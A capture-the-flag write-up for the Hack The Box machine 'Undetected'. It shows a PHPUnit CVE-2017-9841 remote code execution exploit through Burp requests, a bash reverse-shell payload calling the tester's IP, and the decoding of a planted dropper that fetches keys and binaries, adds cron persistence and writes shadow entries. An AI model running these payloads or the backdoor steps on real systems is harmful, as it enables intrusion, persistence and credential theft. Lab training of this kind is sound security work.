 ![image](https://user-images.githubusercontent.com/64952843/165166129-a70c82e7-12d8-4280-965e-f8cdd97b6913.png)

# [UNDETECTED- BOX]            

  Hi folks, today I am going to solve a medium rated hack the box machine,Undetected created by ThecyberGeek.So without any further intro, let's jump in.
# common enumeration

## Nmap
 *TCP over SSH
  *HTTP Default page
  *Host 7.6p1 Ubuntu 4ubuntu0.3
  
#### code-Nmap
```bash
nmap -sC -sV  -A -oN nmap/undetected 10.10.11.146  
```

#### output

![[Undetected/undetected png/nmap.png]]

```shell
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-03 08:58 EDT
Nmap scan report for 10.10.11.146
Host is up (0.54s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2 (protocol 2.0)
| ssh-hostkey: 
|   3072 be:66:06:dd:20:77:ef:98:7f:6e:73:4a:98:a5:d8:f0 (RSA)
|   256 1f:a2:09:72:70:68:f4:58:ed:1f:6c:49:7d:e2:13:39 (ECDSA)
|_  256 70:15:39:94:c2:cd:64:cb:b2:3b:d1:3e:f6:09:44:e8 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Diana's Jewelry

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.64 seconds
```


## Default Page- DIANA' S JEWELRY
so lets chek at the Default page at  http://10.10.11.146

![[Undetected/undetected png/web.png]]

This looks like the official website of a jewelry store. First, let's go around the website to see if there is anything you can use lets check the view store  but first we need to add the hostname to ``/etc/hosts ``file and browse the page.
#### code-/etc/hosts
```bash
echo 10.10.11.146 store.djewelry.htb  djewelry.htb > /etc/hosts
```

lets check the jewelry store.

http://store.djewelry.htb

![[store.png]]


After checking the modules i found out that the web had been moved so i decided to do `gobuster` to find other directories

![[moved.png]]


#### code -gobuster
```bash
gobuster dir -u  http://store.djewelry.htb  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt -k -o gobusters
```

#### Output

![[Undetected/undetected png/gobuster.png]]

```bash
gobuster dir -u  http://store.djewelry.htb  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt -k -o gobusters                         ─╯
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://store.djewelry.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/05/03 09:33:07 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 325] [--> http://store.djewelry.htb/images/]
/.php                 (Status: 403) [Size: 283]                                        
/.html                (Status: 403) [Size: 283]                                        
/js                   (Status: 301) [Size: 321] [--> http://store.djewelry.htb/js/]    
/css                  (Status: 301) [Size: 322] [--> http://store.djewelry.htb/css/]   
/.htm                 (Status: 403) [Size: 283]                                        
/.                    (Status: 200) [Size: 6215]                                       
/fonts                (Status: 301) [Size: 324] [--> http://store.djewelry.htb/fonts/] 
/.htaccess            (Status: 403) [Size: 283]                                        
/.phtml               (Status: 403) [Size: 283]                                        
/vendor               (Status: 301) [Size: 325] [--> http://store.djewelry.htb/vendor/]
/.htc                 (Status: 403) [Size: 283]                     
```

i find something intresthing will i check the directories in vendor http://http://store.djewelry.htb/vendor/

#### Output

![[vendor.png]]

Then as i continued looking trough the directories i found a change log which is something intresting  

#### Output

![[change.png]]

The last time the update changes were made was in `changelog 5.6`  in 2016-10-25 so i decide to check the changelog to see what was changed and why

#### code -changelog 5.6

```bash
# Changes in PHPUnit 5.6

All notable changes of the PHPUnit 5.6 release series are documented in this file using the [Keep a CHANGELOG](http://keepachangelog.com/) principles.

## [5.6.2] - 2016-10-25

New PHAR release due to updated dependencies

## [5.6.1] - 2016-10-07

### Fixed

* Fixed [#2320](https://github.com/sebastianbergmann/phpunit/issues/2320): Conflict between `PHPUnit_Framework_TestCase::getDataSet()` and `PHPUnit_Extensions_Database_TestCase::getDataSet()`

## [5.6.0] - 2016-10-07

### Added

* Merged [#2240](https://github.com/sebastianbergmann/phpunit/pull/2240): Provide access to a test case's data set (for use in `setUp()`, for instance)
* Merged [#2262](https://github.com/sebastianbergmann/phpunit/pull/2262): Add the `PHPUnit_Framework_Constraint_DirectoryExists`, `PHPUnit_Framework_Constraint_IsReadable`, and `PHPUnit_Framework_Constraint_IsWritable` constraints as well as the `assertIsReadable()`, `assertNotIsReadable()`, `assertIsWritable()`, `assertNotIsWritable()`, `assertDirectoryExists()`, `assertDirectoryNotExists()`, `assertDirectoryIsReadable()`, `assertDirectoryNotIsReadable()`, `assertDirectoryIsWritable()`, `assertDirectoryNotIsWritable()`, `assertFileIsReadable()`, `assertFileNotIsReadable()`, `assertFileIsWritable()`, and `assertFileNotIsWritable()` assertions
* Added `PHPUnit\Framework\TestCase::createConfiguredMock()` based on [idea](https://twitter.com/kriswallsmith/status/763550169090625536) by Kris Wallsmith
* Added the `@doesNotPerformAssertions` annotation for excluding a test from the "useless test" risky test check

### Changed

* Deprecated `PHPUnit\Framework\TestCase::setExpectedExceptionRegExp()`
* `PHPUnit_Util_Printer` no longer optionally cleans up HTML output using `ext/tidy`

[5.6.2]: https://github.com/sebastianbergmann/phpunit/compare/5.6.1...5.6.2
[5.6.1]: https://github.com/sebastianbergmann/phpunit/compare/5.6.0...5.6.1
[5.6.0]: https://github.com/sebastianbergmann/phpunit/compare/5.5...5.6.0

```

so i decide to check the vunerability of the phpUnit after that version  of version `5.6.2 and found a CVE of CVE-2017-9841`  which states  that PHPUnit starting with 4.8.19 and before 4.8.28, as well as 5.x before 5.6.3, allows remote attackers to execute arbitrary PHP code via HTTP POST data beginning with a `<?php` substring, as demonstrated by an attack on a site with an exposed /vendor folder, i.e., external access to the `/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php` URI.

## Intial FootHold
According to the vunerabilitie lets try to get something using that exploit so lets set burpsuite and get the phpinfo file . our url will be like this now http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php


#### code -phpinfo
```bash
<?=phpinfo()?>
```

#### code -burp phpinfo

```bash
GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1
Host: store.djewelry.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

<?=phpinfo()?>
```

When we foward the request we found that the phpinfo is sucessfull

#### output

![[php.png]]

so i decide to do some more recorn by doing whoami to see if i can get this execution using vendor 

#### code -whoami
```bash
<?php system("whoami")?>
```

#### output

![[whoami.png]]

The code executes succesfully so i decide to now make and construct  a reverse shell to get into the box 

#### code -reverse shell

```bash
<?php system('/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.16.16/9001 0>&1"')?>
```

so i now the code looks good lets paste it in our burpsuite to get a shell 

#### output

![[buro.png]]


 Then set a netcat listening port on port 9001 
 
#### code-Listening
 ```bash
 nc -lnvp 9001
 ```
 
 After sending the request  a ``reverse shell ``is sent back to our listener which was Listening on port 9001
 
succesful in getting the reverse shell

#### output

![[Undetected/undetected png/shell.png]]

## Takeover
 After geting the reverse shell we have to do some adjusment to our reverse shell to make it ready for using by doing a stty escalation to get an interactive shell:
 #### code-stty
 ```bash
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 [ctrl] + z
 stty raw -echo
 fg [Enter] two times
 ```
 
 Then setting the TERM so that you are able to clean the terminal:
 ```bash
 export TERM=xterm
 ```
  
  
## Privilege Escalation-USER
so i decide to check for user available in the box using thish command

#### code-users
```bash
grep 'bash' /etc/passwd
```

The available users are steven and steven1

#### output

![[users.png]]

I don't have permission to enter the `steven` user directory, there is no idea here i now need a more interactive shell

#### output

![[steve.png]]

so i decide to use **linpeas**  which is s **a well-known enumeration script that searches for possible paths to escalate privileges on Linux/Unix* targets**. https://github.com/carlospolop/PEASS-ng use the latest i downloaded linpeas to my local machine and fowarded it to the box 

use this code to get your ip  tun and use that ip to foward linpeas to the box

#### code-tun0
```shell
ip addr show dev tun0
```

start a python server to where you have downloaded your linpeas you can use your own port

#### code-server
```shell
python3 -m http.server 
```

Then to the box use this code to to get linpeas.sh

#### code-linpeas
```shell
wget ip/linpeas.sh
```

after running the script you will see something like **screen** keyword in red color. This caught my attention.

#### output

![[var.png]]


There are many results from linpeas, so not all of them are posted. Among them, I see one.This file exists in `/var/backups/info`, and it is still www-data permission, go and see

#### output

![[backups.png]]

so i decide to cat  `info`  this is a binary file 


![[binary.png]]


#### code-binary
```bash
776765742074656d7066696c65732e78797a2f617574686f72697a65645f6b657973202d4f202f726f6f742f2e7373682f617574686f72697a65645f6b6579733b20776765742074656d7066696c65732e78797a2f2e6d61696e202d4f202f7661722f6c69622f2e6d61696e3b2063686d6f6420373535202f7661722f6c69622f2e6d61696e3b206563686f20222a2033202a202a202a20726f6f74202f7661722f6c69622f2e6d61696e22203e3e202f6574632f63726f6e7461623b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122313a5c24365c247a5337796b4866464d673361596874345c2431495572685a616e5275445a6866316f49646e6f4f76586f6f6c4b6d6c77626b656742586b2e567447673738654c3757424d364f724e7447625a784b427450753855666d39684d30522f424c6441436f513054396e2f3a31383831333a303a39393939393a373a3a3a203e3e202f6574632f736861646f7722297d27202f6574632f7061737377643b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122202224332220222436222022243722203e2075736572732e74787422297d27202f6574632f7061737377643b207768696c652072656164202d7220757365722067726f757020686f6d65207368656c6c205f3b20646f206563686f202224757365722231223a783a2467726f75703a2467726f75703a2c2c2c3a24686f6d653a247368656c6c22203e3e202f6574632f7061737377643b20646f6e65203c2075736572732e7478743b20726d2075736572732e7478743b
```

so i decide to convert the binary to hexadecimal so as to try to  get something from my pont

#### code-hexadecimal

```bash
echo "776765742074656d7066696c65732e78797a2f617574686f72697a65645f6b657973202d4f202f726f6f742f2e7373682f617574686f72697a65645f6b6579733b20776765742074656d7066696c65732e78797a2f2e6d61696e202d4f202f7661722f6c69622f2e6d61696e3b2063686d6f6420373535202f7661722f6c69622f2e6d61696e3b206563686f20222a2033202a202a202a20726f6f74202f7661722f6c69622f2e6d61696e22203e3e202f6574632f63726f6e7461623b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122313a5c24365c247a5337796b4866464d673361596874345c2431495572685a616e5275445a6866316f49646e6f4f76586f6f6c4b6d6c77626b656742586b2e567447673738654c3757424d364f724e7447625a784b427450753855666d39684d30522f424c6441436f513054396e2f3a31383831333a303a39393939393a373a3a3a203e3e202f6574632f736861646f7722297d27202f6574632f7061737377643b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122202224332220222436222022243722203e2075736572732e74787422297d27202f6574632f7061737377643b207768696c652072656164202d7220757365722067726f757020686f6d65207368656c6c205f3b20646f206563686f202224757365722231223a783a2467726f75703a2467726f75703a2c2c2c3a24686f6d653a247368656c6c22203e3e202f6574632f7061737377643b20646f6e65203c2075736572732e7478743b20726d2075736572732e7478743b" | xxd -r -p
```


#### output

![[hexadecimal.png]]

#### code-hexa

```bash
wget tempfiles.xyz/authorized_keys -O /root/.ssh/authorized_keys; wget tempfiles.xyz/.main -O /var/lib/.main; chmod 755 /var/lib/.main; echo "* 3 * * * root /var/lib/.main" >> /etc/crontab; awk -F":" '$7 == "/bin/bash" && $3 >= 1000 {system("echo "$1"1:\$6\$zS7ykHfFMg3aYht4\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7::: >> /etc/shadow")}' /etc/passwd; awk -F":" '$7 == "/bin/bash" && $3 >= 1000 {system("echo "$1" "$3" "$6" "$7" > users.txt")}' /etc/passwd; while read -r user group home shell _; do echo "$user"1":x:$group:$group:,,,:$home:$shell" >> /etc/passwd; done < users.txt; rm users.txt;   
```

As you can see above there is some useful information in the above converted binary so i need to convert  the string above to `ASCII` format then extract the hashes and modify it 

#### code-hash
```bash
$6$zS7ykHfFMg3aYht4$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/
```

As you can see in the above  hexadecimal the password we will extract from this hash above is for  `steven1`
so i decide to use `john the ripper` which is a free  password cracking tool

#### code-john

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt   hash.txt 
```

#### output
![[john.png]]

John was able to find the password of `steven1 `so lets `ssh` to get more interactive shell

![[Undetected/undetected png/user.png]]

you can now be able to  get `user.txt` because of steven user permission  

## Privilege Escalation-ROOT
so i decide to use **linpeas**  which is s **a well-known enumeration script that searches for possible paths to escalate privileges on Linux/Unix* targets**. https://github.com/carlospolop/PEASS-ng use the latest i downloaded linpeas to my local machine and fowarded it to the box 

#### output
![[Undetected/undetected png/linpeas.png]]

to run linpeas.sh use this code after importing linpeas to the target machine

#### code-linpeas
```bash
bash linpeas.sh
```

after running the script you will see something like **screen** keyword in red color. This caught my attention.

#### output

![[mail.png]]

so i decide to check the info about the email

#### output

![[mailvar.png]]

This probably means that the system has been updated recently, but there is a strange problem on apache, so the mall and database are temporarily moved to another server, and the reason is being investigated. If we need access, we can contact Mark, he will give us a temporary password

Here I guess it should be a f`ake email`.

But let's take a look at the apache service first.

The apache service directory is located in `/usr/lib`

#### output

![[apache2.png]]

We have read and execute permissions on this directory, not bad, go check it out

#### output

![[modules.png]]

Beacuse there is a lot of files, so lets filter a little and sort by the most recent modification that took place recent

#### code-filter

```bash
ls --full-time -i | sort -u
```

#### output

![[sort.png]]

`mode_reader.so `is the recent most modified so lets download to our local shell then be able to see what is inside using the following code and steven password.

#### code-scp

```bash
scp steven1@10.10.11.146:/usr/lib/apache2/modules/mod_reader.so ~/Desktop
```

#### output

![[scp.png]]

after dowloading open it and extract a base64 string

```bash
d2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk
```

Lets analyze the base64 string

#### code-base64
```bash
echo -n 'd2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk' | base64 -d
```

#### output

![[base64.png]]

Here is transfering  this image to sshd and download it to your local pc so as to
Reverse using ghidra use this code

#### code-scp
```bash
scp steven1@10.10.11.146:/usr/sbin/sshd ~/project/HTB/Undetected   
```

#### output

![[sshd.png]]
open Ghidira and analyse `sshd`

#### output

![[ghidra.png]]
As you can see from here, our password is 31 bits and in the decompiler lets get bits so that we can analyze 

#### output

![[decompiler.png]]

#### output

```text
backdoor._28_2_ = 0xa9f4;
backdoor._24_4_ = 0xbcf0b5e3;
backdoor._16_8_ = 0xb2d6f4a0fda0b3d6;
backdoor[30] = -0x5b;
backdoor._0_4_ = 0xf0e7abd6;
backdoor._4_4_ = 0xa4b3a3f3;
backdoor._8_4_ = 0xf7bbfdc8;
backdoor._12_4_ = 0xfdb3d6e7;
```

Let's sort it, from high to low

#### output

```text
backdoor[30] = -0x5b;
backdoor._28_2_ = 0xa9f4;
backdoor._24_4_ = 0xbcf0b5e3;
backdoor._16_8_ = 0xb2d6f4a0fda0b3d6;
backdoor._12_4_ = 0xfdb3d6e7;
backdoor._8_4_ = 0xf7bbfdc8;
backdoor._4_4_ = 0xa4b3a3f3;
backdoor._0_4_ = 0xf0e7abd6;

0x5b
0xa9f4
0xbcf0b5e3
0xb2d6f4a0fda0b3d6
0xfdb3d6e7
0xf7bbfdc8
0xa4b3a3f3
0xf0e7abd6
```

After sorting here, right click to view `0x5b`

#### output

![[oxa5.png]]

It is found that the correct one should be `0xa5`. After modifying it, do some coding.Then lets now use [Cyber chef](https://gchq.github.io/CyberChef/)
which is used to: **Encode, Decode, Format data, Parse data, Encrypt, Decrypt, Compress data, Extract data, perform arithmetic functions against data, defang data, and many other functions**

First convert to `HEX-Hexadecimal` and then convert to `XOR` by using :

1.  `Swap endianness`-which endianness  switches the data from `big-endian `to `little-endian` or vice-versa. Data can be read in as `hexadecimal or raw bytes`. It will be returned in the same format as it is entered.

2.  `From Hex `-Converts a hexadecimal byte string back into its raw value
3. `XOR`- **Exclusive or** or **exclusive disjunction** is a [logical operation](https://en.wikipedia.org/wiki/Logical_connective "Logical connective") that is true if and only if its arguments differ (one is true, the other is false) The Key is 96

#### output

![[cyber.png]]

so as we can see we are able to decode the password so lets `ssh `as root to be able to get the escalation as root

#### output

![[Undetected/undetected png/root.png]]


Successfully obtained the flag file with root privileges

    -------------------------END successful attack @leshack98----------------------
